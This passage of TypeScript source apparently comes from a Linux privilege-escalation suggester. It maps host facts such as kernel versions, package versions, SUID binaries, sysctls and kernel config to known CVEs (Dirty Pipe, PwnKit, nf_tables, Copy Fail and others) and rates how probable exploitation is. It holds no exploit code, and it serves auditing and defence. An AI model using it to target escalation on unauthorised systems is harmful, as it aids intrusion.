      const status = sudo3156PackagePotentiallyVulnerable(facts, version)
      if (!status.vulnerable) return null
      return factMatch('signal', `sudo package version ${version} ${status.reason}`, ['lpe.packages'])
    }
    case 'cve-2025-32463-sudo-chroot': {
      const version = packageVersion(facts, 'sudo')
      if (version && compareNumericVersion(version, '1.9.14') >= 0 && compareNumericVersion(version, '1.9.17') <= 0) {
        return factMatch('signal', `sudo package version ${version} falls in the 1.9.14-1.9.17 heuristic range`, ['lpe.packages'])
      }
      return null
    }
    case 'cve-2017-5618-screen-setuid': {
      const version = packageVersion(facts, 'screen')
      const screen = suidTool(facts, 'screen')
      if (version && compareNumericVersion(version, '4.5.0') === 0 && screen?.setuid) {
        const usable = suidToolUsable(facts, 'screen') && suidTransitionsLikely(facts)
        return factMatch(usable ? 'probable' : 'signal', usable ? 'screen 4.5.0 is installed and the screen binary setuid appears usable' : 'screen 4.5.0 is installed and setuid, but current mount/no_new_privs state may block SUID transitions', ['lpe.packages', 'lpe.suid_tools'])
      }
      return null
    }
    case 'cve-2026-41651-packagekit-pack2theroot': {
      const version = packageVersion(facts, 'packagekit')
      const status = packageKitPotentiallyVulnerable(facts, version)
      if (status.vulnerable) {
        return factMatch('signal', `PackageKit version ${version} ${status.reason}; D-Bus activation/service reachability was not confirmed`, ['lpe.packages'])
      }
      return null
    }
    case 'cve-2022-0847-dirty-pipe':
      if (kernel && kernelInDirtyPipeRange(kernel)) {
        return factMatch('signal', `kernel release ${kernel.release} falls in a Dirty Pipe pre-fix branch`, ['lpe.kernel'])
      }
      return null
    case 'cve-2016-5195-dirty-cow':
      if (kernel && compareKernelVersion(kernel, kv(4, 8, 3)) < 0) {
        return factMatch('signal', `kernel release ${kernel.release} is older than the common CVE-2016-5195 fixed range`, ['lpe.kernel'])
      }
      return null
    case 'cve-2026-31431-copy-fail':
      if (kernel && kernelInCopyFailRange(kernel) && kernelConfigAllEnabled(facts, 'CONFIG_CRYPTO_USER_API_AEAD', 'CONFIG_CRYPTO_AUTHENC')) {
        return factMatch('probable', 'kernel range and AF_ALG AEAD/authenc kernel config match Copy Fail prerequisites', ['lpe.kernel', 'lpe.kernel_config'])
      }
      return null
    case 'cve-2026-43284-43500-dirty-frag':
      if (kernel && (userns.enabled || hasCAPSysAdmin)) {
        const esp = kernelInDirtyFragESPRange(kernel) && dirtyFragESPReachable(facts)
        const rxrpc = kernelInDirtyFragRxRPCRange(kernel) && dirtyFragRxRPCReachable(facts)
        if (esp || rxrpc) {
          return factMatch('probable', 'kernel range, network crypto reachability, and namespace/capability prerequisites match Dirty Frag signals', ['lpe.kernel', 'lpe.kernel_config', 'lpe.modules', 'lpe.sysctls', 'lpe.process_security'])
        }
      }
      return null
    case 'cve-2023-0386-overlayfs': {
      const overlay = modulePresent(facts, 'overlay') || filesystemBool(facts, 'hasOverlay')
      const fuse = modulePresent(facts, 'fuse') || filesystemBool(facts, 'hasFuse')
      if (kernel && kernelBetween(kernel, kv(5, 11, 0), kv(6, 2, 999)) && overlay && userns.enabled) {
        const evidence = ['lpe.kernel', 'lpe.modules', 'lpe.filesystems', 'lpe.sysctls']
        if (fuse) return factMatch('probable', 'kernel range plus OverlayFS/FUSE/userns signals match public exploit prerequisites', evidence)
        return factMatch('signal', 'OverlayFS and user namespaces are present; FUSE signal was not observed', evidence, ['FUSE reachability'])
      }
      return null
    }
    case 'cve-2021-3493-ubuntu-overlayfs': {
      const overlay = modulePresent(facts, 'overlay') || filesystemBool(facts, 'hasOverlay')
      if (kernel && kernelLooksLikeUbuntu(facts) && kernelBetween(kernel, kv(3, 13, 0), kv(5, 13, 999)) && overlay) {
        return factMatch('signal', 'Ubuntu kernel release and OverlayFS signal match public suggester heuristics', ['lpe.kernel', 'lpe.modules', 'lpe.filesystems'])
      }
      return null
    }
    case 'cve-2022-0185-fs-context':
      if (kernel && kernelBetween(kernel, kv(5, 4, 0), kv(5, 16, 2)) && (userns.enabled || hasCAPSysAdmin)) {
        return factMatch('signal', 'kernel range and namespace/capability prerequisites match common public exploit requirements', ['lpe.kernel', 'lpe.sysctls', 'lpe.process_security'])
      }
      return null
    case 'cve-2024-1086-nftables':
      if (kernel && kernelInNfTables1086ExploitRange(kernel) && modulePresent(facts, 'nf_tables')) {
        if (userns.enabled) {
          const caveat = nfTablesInitOnAllocCaveat(kernel, facts)
          const confidence = caveat || kernelReleaseLooksVendorPatched(kernel.release) ? 'signal' : 'probable'
          const reason = caveat
            ? 'kernel range, nf_tables, and userns match, but CONFIG_INIT_ON_ALLOC_DEFAULT_ON is enabled on a 6.4+ kernel'
            : 'kernel range, nf_tables presence, and unprivileged user namespaces match public exploit prerequisites'
          return factMatch(confidence, reason, ['lpe.kernel', 'lpe.modules', 'lpe.sysctls'])
        }
        if (!userns.known) return factMatch('signal', 'nf_tables and kernel range are present, but user namespace state is unknown', ['lpe.kernel', 'lpe.modules'], ['unprivileged user namespace state'])
      }
      return null
    case 'cve-2017-16995-ebpf':
      if (kernel && bpfEnabled && unprivBPFEnabled && kernelBetween(kernel, kv(4, 4, 0), kv(4, 14, 8))) {
        return factMatch('probable', 'kernel range, CONFIG_BPF_SYSCALL, and enabled unprivileged BPF match public exploit prerequisites', ['lpe.kernel', 'lpe.kernel_config', 'lpe.sysctls'])
      }
      return null
    case 'cve-2021-3490-ebpf-alu32':
      if (kernel && bpfEnabled && unprivBPFEnabled && kernelBetween(kernel, kv(5, 7, 0), kv(5, 11, 999))) {
        return factMatch('probable', 'kernel range, CONFIG_BPF_SYSCALL, and enabled unprivileged BPF match public exploit prerequisites', ['lpe.kernel', 'lpe.kernel_config', 'lpe.sysctls'])
      }
      return null
    default:
      return null
  }
}

function factMatch(confidence: 'signal' | 'probable', reason: string, evidenceFactIds: string[], missingPrerequisites: string[] = []): LpeExploitMatch {
  return { matched: true, confidence, reason, evidenceFactIds, missingPrerequisites }
}

function lpeFactIds(doc: any): string[] {
  return Array.isArray(doc?.facts)
    ? doc.facts.map((fact: any) => String(fact?.id ?? '')).filter((id: string) => id.startsWith('lpe.'))
    : []
}

function factMap(doc: any): Map<string, any> {
  const out = new Map<string, any>()
  if (!Array.isArray(doc?.facts)) return out
  for (const fact of doc.facts) {
    if (fact?.id) out.set(String(fact.id), fact.value)
  }
  return out
}

function packageVersion(facts: Map<string, any>, name: string): string {
  const value = facts.get('lpe.packages')
  const packages = Array.isArray(value?.packages) ? value.packages : []
  const item = packages.find((pkg: any) => pkg?.name === name)
  return String(item?.version ?? '')
}

function suidTool(facts: Map<string, any>, name: string): { path?: string; setuid?: boolean; nosuid?: boolean; isDir?: boolean } | null {
  const tools = facts.get('lpe.suid_tools')
  if (!Array.isArray(tools)) return null
  return tools.find((tool: any) => tool?.name === name) ?? null
}

function suidToolUsable(facts: Map<string, any>, name: string): boolean {
  const tool = suidTool(facts, name)
  return Boolean(tool?.setuid) && tool?.isDir !== true && tool?.nosuid !== true
}

function suidTransitionsLikely(facts: Map<string, any>): boolean {
  return String(facts.get('lpe.process_security')?.noNewPrivs ?? '').trim() !== '1'
}

function splitEvidence(value: any): string[] {
  return String(value ?? '')
    .split(',')
    .map(item => item.trim())
    .filter(Boolean)
}

function lpeFactsEligible(facts: Map<string, any>): boolean {
  const status = facts.get('lpe.status')
  if (status?.skipped === true) return false
  const identity = facts.get('identity.current_user')
  return Number(identity?.euid ?? status?.euid ?? 1000) !== 0
}

function osReleaseField(facts: Map<string, any>, key: string): string {
  const kernel = facts.get('lpe.kernel')
  return String(kernel?.osRelease?.[key] ?? '')
}

function packageKitPotentiallyVulnerable(facts: Map<string, any>, version: string): { vulnerable: boolean; reason: string } {
  if (!version) return { vulnerable: false, reason: '' }
  if (osReleaseField(facts, 'ID').toLowerCase() === 'ubuntu') {
    const fixed = ubuntuPackageKitFixedVersion(osReleaseField(facts, 'VERSION_ID'))
    if (fixed) {
      return compareNumericVersion(version, fixed) < 0
        ? { vulnerable: true, reason: `is below Ubuntu fixed package version ${fixed}` }
        : { vulnerable: false, reason: '' }
    }
  }
  return compareNumericVersion(version, '1.0.2') >= 0 && compareNumericVersion(version, '1.3.5') < 0
    ? { vulnerable: true, reason: 'is in the upstream affected range >=1.0.2 <1.3.5; verify distro backports' }
    : { vulnerable: false, reason: '' }
}

function ubuntuPackageKitFixedVersion(versionId: string): string {
  const versions: Record<string, string> = {
    '16.04': '0.8.17-4ubuntu6~gcc5.4ubuntu1.5+esm1',
    '18.04': '1.1.9-1ubuntu2.18.04.6+esm1',
    '20.04': '1.1.13-2ubuntu1.1+esm1',
    '22.04': '1.2.5-2ubuntu3.1',
    '24.04': '1.2.8-2ubuntu1.5',
    '25.10': '1.3.1-1ubuntu1.1',
    '26.04': '1.3.4-3ubuntu1',
  }
  return versions[versionId.replaceAll('"', '')] ?? ''
}

function pwnKitPackagePotentiallyVulnerable(facts: Map<string, any>, version: string): { vulnerable: boolean; reason: string } {
  if (!version) return { vulnerable: false, reason: '' }
  if (osReleaseField(facts, 'ID').toLowerCase() === 'ubuntu') {
    const fixed = ubuntuPwnKitFixedVersion(osReleaseField(facts, 'VERSION_ID'))
    if (fixed) {
      return compareNumericVersion(version, fixed) < 0
        ? { vulnerable: true, reason: `is below Ubuntu fixed package version ${fixed}` }
        : { vulnerable: false, reason: '' }
    }
  }
  return compareNumericVersion(version, '0.105-31') <= 0
    ? { vulnerable: true, reason: 'falls in the generic upstream pre-0.105-31 heuristic range' }
    : { vulnerable: false, reason: '' }
}

function ubuntuPwnKitFixedVersion(versionId: string): string {
  const versions: Record<string, string> = {
    '14.04': '0.105-4ubuntu3.14.04.6',
    '16.04': '0.105-14.1ubuntu0.5',
    '18.04': '0.105-20ubuntu0.18.04.6',
    '20.04': '0.105-26ubuntu1.2',
    '21.10': '0.105-31ubuntu0.1',
    '22.04': '0.105-31ubuntu1',
  }
  return versions[versionId.replaceAll('"', '')] ?? ''
}

function sudo3156PackagePotentiallyVulnerable(facts: Map<string, any>, version: string): { vulnerable: boolean; reason: string } {
  if (!version) return { vulnerable: false, reason: '' }
  if (osReleaseField(facts, 'ID').toLowerCase() === 'ubuntu') {
    const fixed = ubuntuSudo3156FixedVersion(osReleaseField(facts, 'VERSION_ID'))
    if (fixed) {
      return compareNumericVersion(version, fixed) < 0
        ? { vulnerable: true, reason: `is below Ubuntu fixed package version ${fixed}; verify vendor backports` }
        : { vulnerable: false, reason: '' }
    }
  }
  return compareNumericVersion(version, '1.9.5p2') < 0
    ? { vulnerable: true, reason: 'is below upstream 1.9.5p2; verify vendor backports' }
    : { vulnerable: false, reason: '' }
}

function ubuntuSudo3156FixedVersion(versionId: string): string {
  const versions: Record<string, string> = {
    '14.04': '1.8.9p5-1ubuntu1.5',
    '16.04': '1.8.16-0ubuntu1.10',
    '18.04': '1.8.21p2-3ubuntu1.4',
    '20.04': '1.8.31-1ubuntu1.2',
    '20.10': '1.9.1-1ubuntu1.1',
  }
  return versions[versionId.replaceAll('"', '')] ?? ''
}

type KernelVersion = {
  major: number
  minor: number
  patch: number
  release: string
}

function kernelVersionFromFacts(facts: Map<string, any>): KernelVersion | null {
  const release = String(facts.get('lpe.kernel')?.release ?? '')
  if (!release) return null
  const head = release.split('-', 1)[0]
  const parts = head.split('.')
  if (parts.length < 2) return null
  const major = Number.parseInt(parts[0], 10)
  const minor = Number.parseInt(parts[1], 10)
  const patch = Number.parseInt(parts[2] ?? '0', 10)
  if (!Number.isFinite(major) || !Number.isFinite(minor) || !Number.isFinite(patch)) return null
  return { major, minor, patch, release }
}

function kv(major: number, minor: number, patch: number): KernelVersion {
  return { major, minor, patch, release: `${major}.${minor}.${patch}` }
}

function compareKernelVersion(a: KernelVersion, b: KernelVersion): number {
  return compareNumberTuple([a.major, a.minor, a.patch], [b.major, b.minor, b.patch])
}

function kernelBetween(value: KernelVersion, min: KernelVersion, max: KernelVersion): boolean {
  return compareKernelVersion(value, min) >= 0 && compareKernelVersion(value, max) <= 0
}

function kernelInRanges(value: KernelVersion, ranges: Array<[KernelVersion, KernelVersion]>): boolean {
  return ranges.some(([min, max]) => kernelBetween(value, min, max))
}

function kernelInDirtyPipeRange(value: KernelVersion): boolean {
  return kernelInRanges(value, [
    [kv(5, 8, 0), kv(5, 9, 999)],
    [kv(5, 10, 0), kv(5, 10, 101)],
    [kv(5, 11, 0), kv(5, 14, 999)],
    [kv(5, 15, 0), kv(5, 15, 24)],
    [kv(5, 16, 0), kv(5, 16, 10)],
  ])
}

function kernelInNfTables1086ExploitRange(value: KernelVersion): boolean {
  if (!kernelBetween(value, kv(5, 14, 0), kv(6, 6, 999))) return false
  if (value.major === 5 && value.minor === 15 && value.patch >= 149) return false
  if (value.major === 6 && value.minor === 1 && value.patch >= 76) return false
  if (value.major === 6 && value.minor === 6 && value.patch >= 15) return false
  return true
}

function kernelInCopyFailRange(value: KernelVersion): boolean {
  return kernelInRanges(value, [
    [kv(4, 14, 0), kv(5, 10, 253)],
    [kv(5, 11, 0), kv(5, 15, 203)],
    [kv(5, 16, 0), kv(6, 1, 169)],
    [kv(6, 2, 0), kv(6, 6, 136)],
    [kv(6, 7, 0), kv(6, 12, 84)],
    [kv(6, 13, 0), kv(6, 18, 21)],
    [kv(6, 19, 0), kv(6, 19, 11)],
  ])
}

function kernelInDirtyFragESPRange(value: KernelVersion): boolean {
  return kernelInRanges(value, [
    [kv(4, 11, 0), kv(5, 10, 254)],
    [kv(5, 12, 0), kv(5, 15, 204)],
    [kv(5, 16, 0), kv(6, 1, 170)],
    [kv(6, 2, 0), kv(6, 6, 137)],
    [kv(6, 7, 0), kv(6, 12, 86)],
    [kv(6, 13, 0), kv(6, 18, 27)],
    [kv(7, 0, 0), kv(7, 0, 4)],
  ])
}

function kernelInDirtyFragRxRPCRange(value: KernelVersion): boolean {
  return kernelInRanges(value, [
    [kv(5, 4, 0), kv(6, 18, 28)],
    [kv(6, 19, 0), kv(7, 0, 5)],
  ])
}

function compareNumericVersion(a: string, b: string): number {
  return compareNumberTuple(numericVersionParts(a), numericVersionParts(b))
}

function numericVersionParts(value: string): number[] {
  const withoutEpoch = value.includes(':') ? value.split(':').slice(1).join(':') : value
  return Array.from(withoutEpoch.matchAll(/\d+/g), match => Number.parseInt(match[0], 10))
}

function compareNumberTuple(a: number[], b: number[]): number {
  const length = Math.max(a.length, b.length)
  for (let i = 0; i < length; i += 1) {
    const av = a[i] ?? 0
    const bv = b[i] ?? 0
    if (av !== bv) return av > bv ? 1 : -1
  }
  return 0
}

function modulePresent(facts: Map<string, any>, name: string): boolean {
  const modules = facts.get('lpe.modules')
  return arrayIncludesString(modules?.present, name) || arrayIncludesString(modules?.loadedNames, name)
}

function arrayIncludesString(value: any, target: string): boolean {
  return Array.isArray(value) && value.some(item => String(item) === target)
}

function kernelConfigValue(facts: Map<string, any>, key: string): string {
  return String(facts.get('lpe.kernel_config')?.values?.[key] ?? '')
}

function kernelConfigEnabled(facts: Map<string, any>, key: string): { known: boolean; enabled: boolean } {
  const value = kernelConfigValue(facts, key)
  return { known: Boolean(value), enabled: value === 'y' || value === 'm' }
}

function kernelConfigAllEnabled(facts: Map<string, any>, ...keys: string[]): boolean {
  return keys.every(key => kernelConfigEnabled(facts, key).enabled)
}

function sysctlEquals(facts: Map<string, any>, key: string, expected: string): boolean {
  return String(facts.get('lpe.sysctls')?.[key] ?? '').trim() === expected
}

function usernsState(facts: Map<string, any>): { known: boolean; enabled: boolean } {
  const sysctls = facts.get('lpe.sysctls')
  const clone = sysctls?.['kernel.unprivileged_userns_clone']
  if (clone !== undefined) return { known: true, enabled: String(clone).trim() === '1' }
  const max = sysctls?.['user.max_user_namespaces']
  if (max !== undefined) {
    const value = Number.parseInt(String(max).trim(), 10)
    if (Number.isFinite(value)) return { known: true, enabled: value > 0 }
  }
  return { known: false, enabled: false }
}

function filesystemBool(facts: Map<string, any>, key: string): boolean {
  return facts.get('lpe.filesystems')?.[key] === true
}

function capEffectiveHas(facts: Map<string, any>, bit: number): boolean {
  const effective = String(facts.get('lpe.process_security')?.capabilities?.effective ?? '')
  if (!effective) return false
  const value = Number.parseInt(effective, 16)
  return Number.isFinite(value) && (value & (2 ** bit)) !== 0
}

function dirtyFragESPReachable(facts: Map<string, any>): boolean {
  if (modulePresent(facts, 'esp4') || modulePresent(facts, 'esp6')) return true
  const xfrm = kernelConfigEnabled(facts, 'CONFIG_XFRM')
  const esp4 = kernelConfigEnabled(facts, 'CONFIG_INET_ESP')
  const esp6 = kernelConfigEnabled(facts, 'CONFIG_INET6_ESP')
  return xfrm.known && xfrm.enabled && ((esp4.known && esp4.enabled) || (esp6.known && esp6.enabled))
}

function dirtyFragRxRPCReachable(facts: Map<string, any>): boolean {
  return modulePresent(facts, 'rxrpc') || kernelConfigEnabled(facts, 'CONFIG_RXRPC').enabled
}

function nfTablesInitOnAllocCaveat(kernel: KernelVersion, facts: Map<string, any>): boolean {
  return compareKernelVersion(kernel, kv(6, 4, 0)) >= 0 && kernelConfigEnabled(facts, 'CONFIG_INIT_ON_ALLOC_DEFAULT_ON').enabled
}

function kernelReleaseLooksVendorPatched(release: string): boolean {
  const suffix = release.split('-').slice(1).join('-').toLowerCase()
  if (!suffix) return false
  return ['generic', 'amd64', 'ubuntu', 'deb', 'el', 'uek', 'amzn', 'aws', 'azure', 'gcp', 'cloud', 'rt', 'raspi']
    .some(marker => suffix.includes(marker))
}

function kernelLooksLikeUbuntu(facts: Map<string, any>): boolean {
  const kernel = facts.get('lpe.kernel')
  const text = `${kernel?.release ?? ''} ${kernel?.version ?? ''}`.toLowerCase()
  return text.includes('ubuntu') || osReleaseField(facts, 'ID').toLowerCase() === 'ubuntu'
}
